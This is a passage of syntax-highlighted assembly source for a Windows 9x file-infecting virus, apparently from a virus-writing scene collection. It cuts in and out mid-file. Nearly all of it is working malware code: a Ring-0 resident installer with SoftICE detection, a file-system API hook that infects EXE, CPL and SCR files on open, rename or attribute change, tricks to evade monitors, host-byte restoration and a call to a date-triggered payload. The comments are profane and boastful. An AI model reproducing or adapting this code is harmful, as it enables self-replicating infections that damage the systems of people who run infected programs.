        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">                          </span><span class="sc1">; ROR, SHR, SAR... who cares?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                         </span><span class="sc1">; 1st generation shitzor</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">host</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restore_old_bytes</span><span class="sc0">               </span><span class="sc1">; Restore host's first bytes</span><span class="sc0">

</span><span class="sc5">DeactivateSEH</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; Restore old SEH handler</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">back2host</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">00400000h</span><span class="sc0">                   </span><span class="sc1">; Imagebase obtained at</span><span class="sc0">
</span><span class="sc5">ibase</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                             </span><span class="sc1">; runtime</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">00001000h</span><span class="sc0">                   </span><span class="sc1">; Old EIP, patched during</span><span class="sc0">
</span><span class="sc5">base</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                             </span><span class="sc1">; infection time</span><span class="sc0">

        </span><span class="sc7">fninit</span><span class="sc0">                                  </span><span class="sc1">; Uninitialize coprocessor</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; Return to host</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; SHOOT SHOOT SHOOT MOTHERFUCKER!!!!!!!!!!!!!</span><span class="sc0">

</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">; ³ Restore original host's first bytes                                     ³</span><span class="sc0">
</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">

</span><span class="sc5">restore_old_bytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ibase</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Restore first bytes</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">base</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; EDI = Old EIP</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oldjmpy</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; ESI = Original bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">sjumpy</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; I went to god just to see and i was looking at me!</span><span class="sc0">

</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">; ³ Ring-0 code                                                             ³</span><span class="sc0">
</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">

</span><span class="sc5">InterruptHandler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">shitz0r</span><span class="sc0">                         </span><span class="sc1">; Get Ring-0 delta offset</span><span class="sc0">
</span><span class="sc5">shitz0r</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">shitz0r</span><span class="sc0">        

        </span><span class="sc9">IFNDEF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">202h</span><span class="sc0">                        </span><span class="sc1">; Detect SoftICE</span><span class="sc0">
</span><span class="sc5">@@5</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">VMM_Get_DDB</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">no_softice</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">r3_back</span><span class="sc0">                         </span><span class="sc1">; If it's there, avoid install</span><span class="sc0">
</span><span class="sc5">no_softice</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; the virus ;)</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">dr2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"LLIK"</span><span class="sc0">                      </span><span class="sc1">; Are we resident?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">r3_back</span><span class="sc0">                         </span><span class="sc1">; Yez, go away</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">size_to_allocate</span><span class="sc0">                </span><span class="sc1">; Get Memory from the heap</span><span class="sc0">
</span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_GetHeap</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; Fucking VxD services... :)</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Function succesful?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">r3_back</span><span class="sc0">                         </span><span class="sc1">; Back to the boring Ring-3! :(</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">semaphore</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; Reset semaphore variable :)</span><span class="sc0">
       
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Where move virus</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; And save it for later</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poshkiller</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                           </span><span class="sc1">; Move virus to its TSR location ;)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">New_Handler</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Install FileSystem Hook</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_InstallFileSystemApiHook</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; ESI = Last hook handler</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">; ESI = Hook info</span><span class="sc0">
</span><span class="sc5">tunnel</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">tunnel</span><span class="sc0">                          </span><span class="sc1">; If ESI &lt; 7FFFFFFF, it was</span><span class="sc0">
                                                </span><span class="sc1">; the last one :)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ptr_top_chain</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Save in its var in mem</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; EAX = Last hook handler</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">Old_Handler</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"LLIK"</span><span class="sc0">                      </span><span class="sc1">; Kewl residence mark :)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dr2</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">r3_back</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">iretd</span><span class="sc0">                                   </span><span class="sc1">; return to Ring-3 :(</span><span class="sc0">

</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">; ³ FileSystem hook                                                         ³</span><span class="sc0">
</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">

</span><span class="sc5">New_Handler</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">FSA_Hook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">enter</span><span class="sc0">   </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                         </span><span class="sc1">; Create stack frame</span><span class="sc0">

</span><span class="sc1">; Some useful stuff in stack, now in EBP</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [EBP+1Ch] -&gt; pointer to IOREQ structure.</span><span class="sc0">
</span><span class="sc1">; [EBP+18h] -&gt; codepage that the user string was passed in on.</span><span class="sc0">
</span><span class="sc1">; [EBP+14h] -&gt; kind of resource the operation is being performed on.</span><span class="sc0">
</span><span class="sc1">; [EBP+10h] -&gt; the 1-based  drive the operation is being performed on</span><span class="sc0">
</span><span class="sc1">;              (-1 if UNC).</span><span class="sc0">
</span><span class="sc1">; [EBP+0Ch] -&gt; function  that  is being performed.</span><span class="sc0">
</span><span class="sc1">; [EBP+08h] -&gt; address  of the  FSD function  that is to be called for this</span><span class="sc0">
</span><span class="sc1">;              API.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                           </span><span class="sc1">; Push all that with a loop,</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">                         </span><span class="sc1">; that's is the most optimized</span><span class="sc0">
</span><span class="sc5">pushit</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; way to do this :)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">pushit</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; EAX = Function</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">IFSFN_OPEN</span><span class="sc0">              </span><span class="sc1">; File Open? Infect if it is</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infect</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">IFSFN_RENAME</span><span class="sc0">            </span><span class="sc1">; File Rename? Infect if it is</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infect</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">IFSFN_FILEATTRIB</span><span class="sc0">            </span><span class="sc1">; File Attribute change? </span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infect</span><span class="sc0">                          </span><span class="sc1">; Infect if it is</span><span class="sc0">

</span><span class="sc5">back2oldhandler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B8h</span><span class="sc0">                            </span><span class="sc1">; MOV EAX,imm32 opcode</span><span class="sc0">
</span><span class="sc5">Old_Handler</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OldFSA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">; Call previous handler</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                         </span><span class="sc1">; Fix stack</span><span class="sc0">
        </span><span class="sc6">leave</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ring0_delta</span><span class="sc0">                     </span><span class="sc1">; Get delta offset of this</span><span class="sc0">
</span><span class="sc5">ring0_delta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ring0_delta</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">semaphore</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; Avoid recursive infection :)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">pushnback</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">semaphore</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Red light semaphore! :)</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">top_chain</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Make null top chain, so we</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; avoid monitors by means of</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; cutting their balls :)</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infection_stuff</span><span class="sc0">                 </span><span class="sc1">; Infect!</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">                       </span><span class="sc1">; Restore top chain</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">semaphore</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Green light!</span><span class="sc0">

</span><span class="sc5">pushnback</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">back2oldhandler</span><span class="sc0">

</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">; ³ Infect file if EXE                                                      ³</span><span class="sc0">
</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">

</span><span class="sc5">infection_stuff</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">fname</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">wegotdrive</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"@"</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">":"</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">wegotdrive</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; push 00h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">       
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; push 100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; push offset unicode_filename</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; push offset asciiz_filename</span><span class="sc0">

</span><span class="sc5">@@3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">UniToBCSPath</span><span class="sc0">                    </span><span class="sc1">; Convert to ASCII</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Make string null-terminated</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Get end of string :)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">05h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; EAX = Extension of file</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20202020h</span><span class="sc0">                   </span><span class="sc1">; make lowercase extension</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; no, no, no!! :)</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"exe."</span><span class="sc0">                  </span><span class="sc1">; Infect if EXE file</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">itsveryfunny</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"lpc."</span><span class="sc0">                  </span><span class="sc1">; Infect if CPL file</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">itsveryfunny</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"rcs."</span><span class="sc0">                  </span><span class="sc1">; Infect if SRC file</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">itsveryfunny</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">notsofunny</span><span class="sc0">

</span><span class="sc5">itsveryfunny</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">IF</span><span class="sc0">      </span><span class="sc5">DEBUG</span><span class="sc0">                           </span><span class="sc1">; Only if debugging shitz0rz</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc3">"TAOG"</span><span class="sc0">      </span><span class="sc1">; If not a goat, don't execute</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">notsofunny</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">payload</span><span class="sc0">                         </span><span class="sc1">; Lauch payload (if date matchz)</span><span class="sc0">
        

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">fname</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AvoidShitFiles</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
